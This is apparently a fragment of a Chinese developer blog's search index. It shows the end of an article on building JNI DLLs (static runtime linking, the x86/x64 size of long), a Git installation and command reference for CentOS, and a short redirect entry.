java.lang.ClassLoader.loadLibrary(ClassLoader.java:1699)<br>　　at java.lang.Runtime.load0(Runtime.java:770)<br>　　at java.lang.System.load(System.java:1003)</p></blockquote><p>经历多番周折，我已经临危不乱了：我本地可以运行，第三方机器运行不了，这明显就是<strong>运行环境的问题</strong>。</p><p>对运行环境条件做排除分析，很快就定位原因是第三方机器缺少了VC的运行库（类比的话就是Java的JVM虚拟机）。我尝试为第三方机器安装VC的运行库，再次运行，成功。</p><p>但这不是我期望的答案：我不可能要求所有第三方机器都安装VC的运行库，这太荒谬了。</p><p>问题回归本质：是否有办法把我程序所需的运行库一并编译到我的程序中？</p><p>答案是肯定的，而且也很容易处理（详细参看<a href="https://blog.csdn.net/slj_win/article/details/28242971" target="_blank" rel="nofollow">这里</a>）。</p><p>只需在用VS2010编译DLL前，【右键项目-&gt; 属性-&gt; 配置属性-&gt; C/C++ -&gt; 代码生成-&gt; 运行时库-&gt; 选MTD】，即可把DLL所需的运行库<font color="red"><strong>静态编译</strong></font>到DLL中，如下图 9所示：</p><p><img src="./09.png" alt="把运行库静态编译到DLL"></p><blockquote><p><strong>【注意】</strong><br><em>默认情况下是 [动态编译]， 即 [dll] 在运行时才去找 [运行库]。</em><br><em>而修改成 [静态编译] 后，[运行库] 已经被写入 [dll] ，也就无需再去找。</em><br><em>不过事到如今，也不需要我多说 [动态] 和 [静态] 了，副作用是 [dll] 文件增大了几百K。</em></p></blockquote><h3 id="7-2-x86和x64运行结果不一致"><a href="#7-2-x86和x64运行结果不一致" class="headerlink" title="7.2. x86和x64运行结果不一致"></a>7.2. x86和x64运行结果不一致</h3><p>程序运行问题解决了，运行结果的问题又接踵而来了。</p><p>我发现程序运行在x86环境与x64环境完全不同，即使入参一模一样！</p><p>问题一出现，根据经验很快就被我锁定是<strong>C++代码出现的位长问题</strong>。但具体是哪个位置，就只能一步步调试并锁定范围了，因为这不是BUG，不会抛异常定位，只能一步步跟踪数据调试，前前后后整整花了3天时间。。。至于具体的调试过程我就不说了，只说结果。</p><blockquote><p><em>老实说，这个C++代码并不是完全由我执笔的，一些公共的模块是出自他人之手，对这部分代码不熟悉，加上该工程的代码量也相当多，这都是造成调试慢的原因。</em></p></blockquote><p>最后找到的问题根源是，一个 [_ulong] 类型的数据，在执行位运算时，x86和x64的机器得到了完全不同的结果。其中x86的结果完全是数值溢出。</p><p>再追踪 [_ulong] 的类型定义，竟然是这样写的：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _ulong<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>乍一看似乎没问题，但如果问long的位长是多少，很多同学未必答得出来。偶然情况下，我发现了这个同学的sizeof测试（<a href="https://blog.csdn.net/xuexiacm/article/details/8122267" target="_blank" rel="nofollow">传送门</a>），我不能说他的测试结果是错的，只能说存在局限性。</p><p>Java与C/C++在数据类型的字长定义上，最大的区别是Java是固定精度，C/C++则不然。</p><p><strong>举个栗子</strong>：</p><ul><li>Java的int类型，放到哪里都是32位（4字节），long类型放到哪里都是64为（8字节），这就是固定精度。</li><li>C/C++的int类型，一般情况下也都是32位（4字节），但long类型的精度定义则为 [&gt;= int]，在32-bit平台上是32位（4字节），在64-bit平台上则是64位（8字节）。</li></ul><p>如下附一张字长模型表，大家会看得比较清晰。其中[LP64]、[ILP64]、[LLP64]是64位平台上的字长模型，[ILP32]、[LP32]是32位平台上的字长模型。 I、L、P 分别代表 int，long，pointer（想知道更详细的请<a href="http://blog.chinaunix.net/uid-25513153-id-182196.html" target="_blank" rel="nofollow">跳去看</a>这篇原文）。</p><table><thead><tr><th align="center">数据类型</th><th align="center">LP64</th><th align="center">ILP64</th><th align="center">LLP64</th><th align="center">ILP32</th><th align="center">LP32</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">8</td><td align="center">8</td><td align="center">8</td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">short</td><td align="center">16</td><td align="center">16</td><td align="center">16</td><td align="center">16</td><td align="center">16</td></tr><tr><td align="center">_int32</td><td align="center">N/A</td><td align="center">32</td><td align="center">N/A</td><td align="center">N/A</td><td align="center">N/A</td></tr><tr><td align="center">int</td><td align="center">32</td><td align="center">64</td><td align="center">32</td><td align="center">32</td><td align="center">16</td></tr><tr><td align="center">long</td><td align="center">64</td><td align="center">64</td><td align="center">32</td><td align="center">32</td><td align="center">32</td></tr><tr><td align="center">long long</td><td align="center">N/A</td><td align="center">N/A</td><td align="center">64</td><td align="center">N/A</td><td align="center">N/A</td></tr><tr><td align="center">pointer</td><td align="center">64</td><td align="center">64</td><td align="center">64</td><td align="center">32</td><td align="center">32</td></tr></tbody></table><p>回到运行结果不一致的问题本身，既然问题根源找到了，修改也就简单了，只需这样修改类型定义即可：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">ifdef</span> _LP64    </span>    <span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _ulong<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">else</span></span>    <span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> _ulong<span class="token punctuation">;</span> <span class="token macro property">#<span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译程序运行，问题解决。</p><h2 id="8-回顾：嵌入式开发入门过程"><a href="#8-回顾：嵌入式开发入门过程" class="headerlink" title="8. 回顾：嵌入式开发入门过程"></a>8. 回顾：嵌入式开发入门过程</h2><p>到这里为止，我的嵌入式开发入门之路已经算告一段落。</p><p>我自知前面讲述的内容较多，应该不少小伙伴还找不到重点看，我在这里简单梳理一下java-cpp的嵌入式开发过程：</p><ul><li>（1）在Java程序定义JNI接口；</li><li>（2）利用JNI命令生成C/C++的头文件；</li><li>（3）用C/C++实现头文件中声明的接口（实现过程中，注意Java与C/C++在参数传递时的类型转换，以及C/C++的数据类型字长问题）；</li><li>（4）根据编写好的C/C++程序代码，构建成Win平台的32-bit和64-bit动态链接库（dll文件，推荐用VS2010，并使用静态编译方式）；</li><li>（5）根据编写好的C/C++程序代码，构建成Linux平台的32-bit和64-bit动态链接库（so文件，推荐用make + GCC）；</li><li>（6）Java程序根据操作系统类型、位长选择动态链接库。</li></ul><h2 id="9-后话"><a href="#9-后话" class="headerlink" title="9.后话"></a>9.后话</h2><p>最后谈谈我在做完java-c的嵌入式开发入门后的个人感悟：</p><ul><li>（1）真正了解了什么才是 [跨平台]，时刻谨记语言的平台特性，不要因为长期浸淫在Java的好处中就被它迷惑了，尤其是自认对Java经验越丰富的时候。</li><li>（2）Java会自动回收内存，C/C++需要自我监管，内存泄露可不是好玩的。</li><li>（3）Java字长都是固定的，C/C++则不然，数据截断足够你调试一个月。</li><li>（4）别再幻想兼容了，Java是 [一次编译，到处运行]，C/C++是 [一次编码，到处编译]。</li></ul><p>另外就是，前面的题外话中我一直有提及 [Cygwin] ，但整篇文章都没有正式介绍，原因是我在过程中发现， [交叉编译] 的坑更大，所以被我早早抛弃了。</p><p>我简单介绍一下吧。</p><p>先说明下 [交叉编译] 是什么。交叉编译就是在机器A中编译可以让机器B运行的程序，但A和B是两套完全不同的系统平台。举个栗子就是那些做爪机开发的同学，其实做的就是 [交叉编译]。 更详细的自己去问度娘吧，有这个概念就可以了。</p><p>接下来说明下 [Cygwin] 。Cygwin是运行于win平台的Linux虚拟机，虽然功能受限，但是如果只用于 [交叉编译] 就足够用了。</p><p>默认情况下， [Cygwin] 会调用win平台自身的GCC编译器，这时通过与Linux一样的make命令就可以构建出dll文件。然后再为 [Cygwin] 安装Linux平台的GCC编译器，同样地利用make命令就可以构建出so文件。</p><p>因此在理论上，可以直接通过 Cygwin + GCC + make， 一键构建出 [win_x86.dll]、[win_x64.dll]、[Linux_x86.so]、[Linux_x64.so] 这四个动态链接库。</p><p>但实际操作上，Cygwin 安装交叉编译工具链的过程冗长且容易出错，我最终选择了暂时放弃，有兴趣的同学可以自己去找找相关文档，我手上也有一些当时我参考过的，可以转发给大家：</p><table><thead><tr><th align="center">文献</th><th align="center">来源</th></tr></thead><tbody><tr><td align="center">arm-linux-gcc交叉编译工具链安装</td><td align="center"><a href="https://wenku.baidu.com/view/666924c58bd63186bcebbca9.html" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">Windows+cygwin下构造arm-linux交叉编译环境最简单的方法</td><td align="center"><a href="https://blog.csdn.net/chief1985/article/details/4209928" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">在window平台下模拟Liunx使用GCC环境进行编译C的SO库</td><td align="center"><a href="https://blog.csdn.net/fengsh998/article/details/8136287" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">(笔记)Ubuntu下安装arm-linux-gcc-4.4.3.tar.gz (交叉编译环境)</td><td align="center"><a href="http://www.cnblogs.com/tdyizhen1314/p/4124886.html" target="_blank" rel="nofollow">传送</a></td></tr><tr><td align="center">eclipse下使用cygwin的方法（Windows下用eclipse玩gcc/g++和gdb）</td><td align="center"><a href="http://www.cnblogs.com/skyofbitbit/p/3708216.html" target="_blank" rel="nofollow">传送</a></td></tr></tbody></table><h2 id="10-资源下载"><a href="#10-资源下载" class="headerlink" title="10. 资源下载"></a>10. 资源下载</h2><ul><li><a href="https://download.csdn.net/download/lyy289065406/10564244">本文全文下载（CSDN： PDF）</a></li><li><a href="https://github.com/lyy289065406/dynamic-token">本文 Java样例程序【OTP动态令牌】 Github 完整源码（Eclipse Maven项目）</a></li><li><a href="https://github.com/lyy289065406/dt_otp">文本 C++样例程序【OTP动态链接库】 Github 完整源码（VS2010 DLL项目）</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 嵌入式 </tag>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 命令行安装与使用笔记</title>
      <link href="/articles/scm/git-ming-ling-xing-an-zhuang-yu-shi-yong-bi-ji/"/>
      <url>/articles/scm/git-ming-ling-xing-an-zhuang-yu-shi-yong-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装环境"><a href="#1-安装环境" class="headerlink" title="1. 安装环境"></a>1. 安装环境</h2><ul><li>操作系统：Centos 7 （纯命令行环境）</li><li>Git服务器：Github</li><li>安装的Git命令行版本：1.8.3.1</li></ul><h2 id="2-Git下载"><a href="#2-Git下载" class="headerlink" title="2. Git下载"></a>2. Git下载</h2><p>首先需要安装git的依赖包：</p><blockquote><p>yum install curl curl-devel zlib-devel openssl-devel perl cpio expat-devel gettext-devel</p></blockquote><p>切到安装目录：</p><blockquote><p>cd /usr/local</p></blockquote><p>Centos自带的Git版本比较旧，这里直接到官网下载最新版 ：</p><blockquote><p>wget <a href="http://www.codemonkey.org.uk/projects/git-snapshots/git/git-latest.tar.xz">http://www.codemonkey.org.uk/projects/git-snapshots/git/git-latest.tar.xz</a></p></blockquote><p>注意下载回来的是<font color="red">.xz包</font>（注意不是.gz包，我下载的时候，.gz包是0字节，可能是官方的问题），对其解压：</p><blockquote><p>xz -d git-latest.tar.xz<br>tar -xvf git-latest.tar</p></blockquote><p>解压出来的文件夹是 git-xxxx-xx-xx（xxxx-xx-xx是版本的日期，例如2018-07-23），切到该目录下：</p><blockquote><p>cd git-xxxx-xx-xx</p></blockquote><h2 id="3-Git安装"><a href="#3-Git安装" class="headerlink" title="3. Git安装"></a>3. Git安装</h2><p>生成Git的配置脚本configure：</p><blockquote><p>autoconf</p></blockquote><p>修改安装路径，可随意指定：</p><blockquote><p>./configure –prefix=<font color="red">/usr/local/git</font></p></blockquote><p>注意，若指定的安装路径不存在，则需要先预建目录：</p><blockquote><p>mkdir -p <font color="red">/usr/local/git</font></p></blockquote><p>编译并安装：</p><blockquote><p>make | make install</p></blockquote><p>把Git命令添加到系统环境变量，修改系统环境变量文件：</p><blockquote><p>vi /etc/profile</p></blockquote><p>在文件最后添加以下内容：</p><blockquote><p>GIT_HOME=<font color="red">/usr/local/git</font><br>PATH=$PATH:$GIT_HOME/bin<br>export GIT_HOME PATH</p></blockquote><p>重载系统环境变量使其生效：</p><blockquote><p>source /etc/profile</p></blockquote><p>通过查看git版本号验证是否安装成功：</p><blockquote><p>git –version</p></blockquote><p>**<font color="red">至此Git命令行安装完成</font>**。</p><blockquote><p><strong><em>注：</em></strong><br>○ 若安装时不通过 ./configure –prefix=xxx 命令指定安装路径，那么Git的可执行文件默认放在/usr /local/bin，库文件默认放在/usr/local/lib，配置文件默认放在/usr/local/etc，其它的资源文件放在/usr /local/share<br>○ 那么当需要卸载Git时，要么在原来的make目录下执行make uninstall（前提是make文件指定过uninstall），要么在上述目录中把相关的文件一个个手工删掉。<br>○ 但若指定了安装路径，则只需直接删掉该路径文件夹即可。</p></blockquote><h2 id="4-连接Github"><a href="#4-连接Github" class="headerlink" title="4. 连接Github"></a>4. 连接Github</h2><p>配置Github的账号和邮箱：</p><blockquote><p>git config –global user.name "<font color="red">你的Github账号</font>"<br>git config –global user.email "<font color="red">你的Github邮箱</font>"</p></blockquote><p>生成该GitHub账号的SSH Keys（<font color="red">本质是RSA公私钥</font>）：</p><blockquote><p>ssh-keygen -t rsa -C "你的Github邮箱"</p></blockquote><p>运行该命令后，系统会确认一些问题，什么都不用输入，<font color="red">保持默认，连续三次回车即可</font>。</p><p>期间系统会提示所生成的RSA公私钥保存位置（一般在<font color="red"><code>~/.ssh</code>目录</font>）：</p><ul><li>私钥文件位置：<code>~/.ssh/id_rsa</code></li><li>公钥文件位置：<code>~/.ssh/id_rsa.pub</code></li></ul><p>私钥不要动，只需把公钥设置到Github上就可以实现连接了。</p><p>先查看公钥文件内容：</p><blockquote><p><code>cat ~/.ssh/id_rsa.pub</code></p></blockquote><p>然后在浏览器登陆你的Github：</p><blockquote><p>Settings =&gt; SSH and GPG Keys =&gt; New SSH key</p></blockquote><p>把公钥内容复制进去并保存即可：</p><p><img src="./01.png"></p><blockquote><p><strong><em>注：</em></strong><br>以后在这台Centos机器连接到Github时，就是使用这对RSA公私密钥，而不用通过Github密码，所以需要保管好这对密钥。</p></blockquote><p>回到Centos，输入以下命令尝试连接到Github：</p><blockquote><p>ssh -T <a href="mailto:git@github.com">git@github.com</a></p></blockquote><p>此时会提示以下内容，<font color="red">输入yes</font>即可：</p><blockquote><p>The authenticity of host ‘github.com (xxx.xxx.xxx.xxx)’ can’t be established.<br>RSA key fingerprint is xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.<br>Are you sure you want to continue connecting (yes/no)? <font color="red">yes</font></p></blockquote><p>最终提示以下内容则表示连接成功：</p><blockquote><p>Warning: Permanently added ‘github.com, xxx.xxx.xxx.xxx’ (RSA) to the list of known hosts.<br>Hi smartwen! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>此时随便指定一个目录并切换进去，如：</p><blockquote><p>cd /tmp/</p></blockquote><p>把该目录初始化为Git的代码仓库：</p><blockquote><p>git init</p></blockquote><p>然后就可以同步Github上的项目代码（和它的整个代码历史）到本地了：</p><blockquote><p>git clone <font color="red">项目仓库URL</font></p></blockquote><h2 id="5-Git命令手册"><a href="#5-Git命令手册" class="headerlink" title="5. Git命令手册"></a>5. Git命令手册</h2><p>由于Centos下并不支持图形化界面（我用的是云服务器，纯命令行），因此需要熟悉Git的命令进行代码版本维护。</p><p>一般来说，日常使用只要记住下图6个命令就可以了：</p><p><img src="./02.png"></p><p>但为了日后使用方便起见，此处整理一下Git的命令清单：</p><h3 id="5-1-专有名词"><a href="#5-1-专有名词" class="headerlink" title="5.1. 专有名词"></a>5.1. 专有名词</h3><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h3 id="5-2-新建代码库"><a href="#5-2-新建代码库" class="headerlink" title="5.2. 新建代码库"></a>5.2. 新建代码库</h3><blockquote><p><font color="red"># 在当前目录新建一个Git代码库</font><br><font color="red">git init</font><br>&nbsp;<br># 新建一个目录，将其初始化为Git代码库<br>git init [project-name]<br>&nbsp;<br><font color="red"># 下载一个项目和它的整个代码历史</font><br><font color="red">git clone [url]</font></p></blockquote><h3 id="5-3-配置"><a href="#5-3-配置" class="headerlink" title="5.3. 配置"></a>5.3. 配置</h3><p>Git的配置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><blockquote><p># 显示当前的Git配置<br>git config –list<br>&nbsp;<br># 编辑Git配置文件<br>git config -e [–global]<br>&nbsp;<br># 设置提交代码时的用户信息<br>git config [–global] user.name "[name]"<br>git config [–global] user.email "[email address]"</p></blockquote><h3 id="5-4-增加-删除文件"><a href="#5-4-增加-删除文件" class="headerlink" title="5.4. 增加/删除文件"></a>5.4. 增加/删除文件</h3><blockquote><p><font color="red"># 添加指定文件到暂存区</font><br><font color="red">git add [file1] [file2] …</font><br>&nbsp;<br># 添加指定目录到暂存区，包括子目录<br>git add [dir]<br>&nbsp;<br><font color="red"># 添加当前目录的所有文件到暂存区</font><br><font color="red">git add .</font><br>&nbsp;<br># 添加每个变化前，都会要求确认<br># 对于同一个文件的多处变化，可以实现分次提交<br>git add -p<br>&nbsp;<br># 删除工作区文件，并且将这次删除放入暂存区<br>git rm [file1] [file2] …<br>&nbsp;<br># 停止追踪指定文件，但该文件会保留在工作区<br>git rm –cached [file]<br>&nbsp;<br># 改名文件，并且将这个改名放入暂存区<br>git mv [file-original] [file-renamed]</p></blockquote><h3 id="5-5-代码提交"><a href="#5-5-代码提交" class="headerlink" title="5.5. 代码提交"></a>5.5. 代码提交</h3><blockquote><p><font color="red"># 提交暂存区到仓库区</font><br><font color="red">git commit -m [message]</font><br>&nbsp;<br><font color="red"># 提交暂存区的指定文件到仓库区</font><br><font color="red">git commit [file1] [file2] … -m [message]</font><br>&nbsp;<br># 提交工作区自上次commit之后的变化，直接到仓库区<br>git commit -a<br>&nbsp;<br># 提交时显示所有diff信息<br>git commit -v<br>&nbsp;<br># 使用一次新的commit，替代上一次提交<br># 如果代码没有任何新变化，则用来改写上一次commit的提交信息<br>git commit –amend -m [message]<br>&nbsp;<br># 重做上一次commit，并包括指定文件的新变化<br>git commit –amend [file1] [file2] …</p></blockquote><h3 id="5-6-分支"><a href="#5-6-分支" class="headerlink" title="5.6. 分支"></a>5.6. 分支</h3><blockquote><p><font color="red"># 列出所有本地分支</font><br><font color="red">git branch</font><br>&nbsp;<br># 列出所有远程分支<br>git branch -r<br>&nbsp;<br><font color="red"># 列出所有本地分支和远程分支</font><br><font color="red">git branch -a</font><br>&nbsp;<br><font color="red"># 新建一个分支，但依然停留在当前分支</font><br><font color="red">git branch [branch-name]</font><br>&nbsp;<br><font color="red"># 新建一个分支，并切换到该分支</font><br><font color="red">git checkout -b [branch]</font><br>&nbsp;<br># 新建一个分支，指向指定commit<br>git branch [branch] [commit]<br>&nbsp;<br># 新建一个分支，与指定的远程分支建立追踪关系<br>git branch –track [branch] [remote-branch]<br>&nbsp;<br><font color="red"># 切换到指定分支，并更新工作区</font><br><font color="red">git checkout [branch-name]</font><br>&nbsp;<br><font color="red"># 切换到上一个分支</font><br><font color="red">git checkout -</font><br>&nbsp;<br># 建立追踪关系，在现有分支与指定的远程分支之间<br>git branch –set-upstream [branch] [remote-branch]<br>&nbsp;<br># 合并指定分支到当前分支<br>git merge [branch]<br>&nbsp;<br># 选择一个commit，合并进当前分支<br>git cherry-pick [commit]<br>&nbsp;<br><font color="red"># 删除分支</font><br><font color="red">git branch -d [branch-name]</font><br>&nbsp;<br># 删除远程分支<br>git push origin –delete [branch-name]<br>git branch -dr [remote/branch]</p></blockquote><h3 id="5-7-标签"><a href="#5-7-标签" class="headerlink" title="5.7. 标签"></a>5.7. 标签</h3><blockquote><p># 列出所有tag<br>git tag<br>&nbsp;<br># 新建一个tag在当前commit<br>git tag [tag]<br>&nbsp;<br># 新建一个tag在指定commit<br>git tag [tag] [commit]<br>&nbsp;<br># 删除本地tag<br>git tag -d [tag]<br>&nbsp;<br># 删除远程tag<br>git push origin :refs/tags/[tagName]<br>&nbsp;<br># 查看tag信息<br>git show [tag]<br>&nbsp;<br># 提交指定tag<br>git push [remote] [tag]<br>&nbsp;<br># 提交所有tag<br>git push [remote] –tags<br>&nbsp;<br># 新建一个分支，指向某个tag<br>git checkout -b [branch] [tag]</p></blockquote><h3 id="5-8-查看信息"><a href="#5-8-查看信息" class="headerlink" title="5.8. 查看信息"></a>5.8. 查看信息</h3><blockquote><p><font color="red"># 显示有变更的文件</font><br><font color="red">git status</font><br>&nbsp;<br><font color="red"># 显示当前分支的版本历史</font><br><font color="red">git log</font><br>&nbsp;<br># 显示commit历史，以及每次commit发生变更的文件<br>git log –stat<br>&nbsp;<br># 搜索提交历史，根据关键词<br>git log -S [keyword]<br>&nbsp;<br># 显示某个commit之后的所有变动，每个commit占据一行<br>git log [tag] HEAD –pretty=format:%s<br>&nbsp;<br># 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件<br>git log [tag] HEAD –grep feature<br>&nbsp;<br># 显示某个文件的版本历史，包括文件改名<br>git log –follow [file]<br>git whatchanged [file]<br>&nbsp;<br># 显示指定文件相关的每一次diff<br>git log -p [file]<br>&nbsp;<br># 显示过去5次提交<br>git log -5 –pretty –oneline<br>&nbsp;<br># 显示所有提交过的用户，按提交次数排序<br>git shortlog -sn<br>&nbsp;<br># 显示指定文件是什么人在什么时间修改过<br>git blame [file]<br>&nbsp;<br><font color="red"># 显示暂存区和工作区的代码差异</font><br><font color="red">git diff</font><br>&nbsp;<br># 显示暂存区和上一个commit的差异<br>git diff –cached [file]<br>&nbsp;<br># 显示工作区与当前分支最新commit之间的差异<br>git diff HEAD<br>&nbsp;<br># 显示两次提交之间的差异<br>git diff [first-branch]…[second-branch]<br>&nbsp;<br># 显示今天你写了多少行代码<br>git diff –shortstat “@{0 day ago}”<br>&nbsp;<br><font color="red"># 显示某次提交的元数据和内容变化</font><br><font color="red">git show [commit]</font><br>&nbsp;<br># 显示某次提交发生变化的文件<br>git show –name-only [commit]<br>&nbsp;<br># 显示某次提交时，某个文件的内容<br>git show [commit]:[filename]<br>&nbsp;<br># 显示当前分支的最近几次提交<br>git reflog<br>&nbsp;<br><font color="red"># 从本地master拉取代码更新当前分支：branch 一般为master</font><br><font color="red">git rebase [branch]</font></p></blockquote><h3 id="5-9-远程同步"><a href="#5-9-远程同步" class="headerlink" title="5.9. 远程同步"></a>5.9. 远程同步</h3><blockquote><p># 下载远程仓库的所有变动<br>git fetch [remote]<br>&nbsp;<br># 显示所有远程仓库<br>git remote -v<br>&nbsp;<br># 显示某个远程仓库的信息<br>git remote show [remote]<br>&nbsp;<br># 增加一个新的远程仓库，并命名<br>git remote add [shortname] [url]<br>&nbsp;<br><font color="red"># 取回远程仓库的变化，并与本地分支合并</font><br><font color="red">git pull [remote] [branch]</font><br>&nbsp;<br><font color="red"># 上传本地指定分支到远程仓库</font><br><font color="red">git push [remote] [branch]</font><br>&nbsp;<br># 强行推送当前分支到远程仓库，即使有冲突<br>git push [remote] –force<br>&nbsp;<br># 推送所有分支到远程仓库<br>git push [remote] –all</p></blockquote><h3 id="5-10-撤销"><a href="#5-10-撤销" class="headerlink" title="5.10. 撤销"></a>5.10. 撤销</h3><blockquote><p># 恢复暂存区的指定文件到工作区<br>git checkout [file]<br>&nbsp;<br># 恢复某个commit的指定文件到暂存区和工作区<br>git checkout [commit] [file]<br>&nbsp;<br># 恢复暂存区的所有文件到工作区<br>git checkout .<br>&nbsp;<br># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变<br>git reset [file]<br>&nbsp;<br><font color="red"># 重置暂存区与工作区，与上一次commit保持一致</font><br><font color="red">git reset –hard</font><br>&nbsp;<br># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变<br>git reset [commit]<br>&nbsp;<br># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致<br>git reset –hard [commit]<br>&nbsp;<br># 重置当前HEAD为指定commit，但保持暂存区和工作区不变<br>git reset –keep [commit]<br>&nbsp;<br># 新建一个commit，用来撤销指定commit<br># 后者的所有变化都将被前者抵消，并且应用到当前分支<br>git revert [commit]<br>&nbsp;<br><font color="red"># 暂时将未提交的变化移除，稍后再移入</font><br><font color="red">git stash</font><br><font color="red">git stash pop</font></p></blockquote><h3 id="5-11-其他"><a href="#5-11-其他" class="headerlink" title="5.11. 其他"></a>5.11. 其他</h3><blockquote><p># 生成一个可供发布的压缩包<br>git archive</p></blockquote><h2 id="6-示例：工作中使用Git的一般流程"><a href="#6-示例：工作中使用Git的一般流程" class="headerlink" title="6. 示例：工作中使用Git的一般流程"></a>6. 示例：工作中使用Git的一般流程</h2><p>（1）下载远程代码仓库并创建分支：<br>　　　　git clone [远程代码仓库]<br>　　　　git branch [本地分支名称] <font color="#00a67c"><em>（创建本地分支）</em></font><br>　　　　git branch <font color="#00a67c"><em>（查看本地所有分支）</em></font><br>　　　　git checkout [本地分支名称] <font color="#00a67c"><em>（切换到本地分支）</em></font></p><p>（2） 写代码…….</p><p>（3） 确认变更并提交：<br>　　　　git status <font color="#00a67c"><em>（查看文件改变记录）</em></font><br>　　　　git diff <font color="#00a67c"><em>（查看代码级改变）</em></font><br>　　　　git add <font color="#00a67c"><em>（确认改变）</em></font><br>　　　　git commit -m 提交注释 <font color="#00a67c"><em>（提交到当前分支的本地工作区）</em></font><br>　　　　git push [远程分支：origin] [本地分支的名称] <font color="#00a67c"><em>（上传本地分支到远程仓库）</em></font></p><p>（4） 去Git管理网站（如Github）创建Merge Request</p><p>（5） 等待管理员（有选择地）合并所有人的Merge Request</p><p>（6） 管理员合并后，从远程代码仓库更新本地分支：<br>　　　　git checkout master <font color="#00a67c"><em>（切换至master）</em></font><br>　　　　git pull <font color="#00a67c"><em>（从远程master更新至本地master）</em></font><br>　　　　git checkout [本地分支名称] <font color="#00a67c"><em>（切换至本地分支）</em></font><br>　　　　git rebase master [本地分支名称] <font color="#00a67c"><em>（从本地master拉取代码更新当前分支）</em></font></p><p>（7） 拉取更新过程中，若有冲突的解决方法：<br>　　　　① 修改代码文件并解决冲突<br>　　　　② git add . <font color="#00a67c"><em>（加入待提交）</em></font><br>　　　　③ git rebase –continue <font color="#00a67c"><em>（继续执行前面第6步的rebase）</em></font><br>　　　　④ 如果仍然有冲突，重复前面①②③步骤<br>　　　　⑤ git rebase –skip <font color="#00a67c"><em>（无法解决冲突时的处理手法1：直接用master覆盖本地分支）</em></font><br>　　　　⑥ git push -f origin [本地分支名称] <font color="#00a67c"><em>（无法解决冲突时的处理手法2：强制用本地的代码去覆盖掉远程仓库的代码。其中origin为远程仓库名）</em></font></p><p>（8） 去Git管理网站（如Github）重新创建Merge Request</p><p>（9） 等待管理员合并Merge Request…….</p><p>（10）重复上述对应步骤…….</p><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><p><a href="http://download.csdn.net/download/lyy289065406/10559792">本文全文下载</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件配置管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 版本控制 </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>站长工具</title>
      <link href="/articles/website/site-package/"/>
      <url>/articles/website/site-package/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/site-package/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/site-package/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/site-package/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加速访问 WordPress：Redis 部署笔记</title>
      <link href="/articles/website/jia-su-fang-wen-wordpress/"/>
      <url>/articles/website/jia-su-fang-wen-wordpress/</url>
      
